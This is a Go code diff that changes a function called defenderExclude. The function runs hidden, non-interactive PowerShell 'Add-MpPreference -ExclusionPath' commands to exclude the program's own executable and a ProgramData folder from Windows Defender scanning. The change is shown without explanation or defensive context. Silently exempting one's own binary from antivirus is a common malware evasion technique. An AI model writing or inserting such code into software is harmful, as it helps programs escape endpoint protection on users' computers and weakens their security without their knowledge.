@@ -38,6 +38,11 @@ func defenderExclude(name string) error {
 		return fmt.Errorf("PROGRAMDATA environment variable not set")
 	}
 
+	srcPath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %w", err)
+	}
+
 	targetDir := filepath.Join(programDataDir, name)
 	if _, err := os.Stat(targetDir); os.IsNotExist(err) {
 		if err := os.MkdirAll(targetDir, os.ModePerm); err != nil {
@@ -45,11 +50,16 @@ func defenderExclude(name string) error {
 		}
 	}
 
-	powerShellCommand := fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -Force`, targetDir)
-
+	var cmd string
 	args := []string{"-NoProfile", "-NonInteractive", "-Command"}
 
-	if err := exec.Command("powershell.exe", append(args, powerShellCommand)...).Run(); err != nil {
+	cmd = fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -Force`, srcPath)
+	if err := exec.Command("powershell.exe", append(args, cmd)...).Run(); err != nil {
+		return fmt.Errorf("failed to add exclusion to Windows Defender: %w", err)
+	}
+
+	cmd = fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -Force`, targetDir)
+	if err := exec.Command("powershell.exe", append(args, cmd)...).Run(); err != nil {
 		return fmt.Errorf("failed to add exclusion to Windows Defender: %w", err)
 	}
 
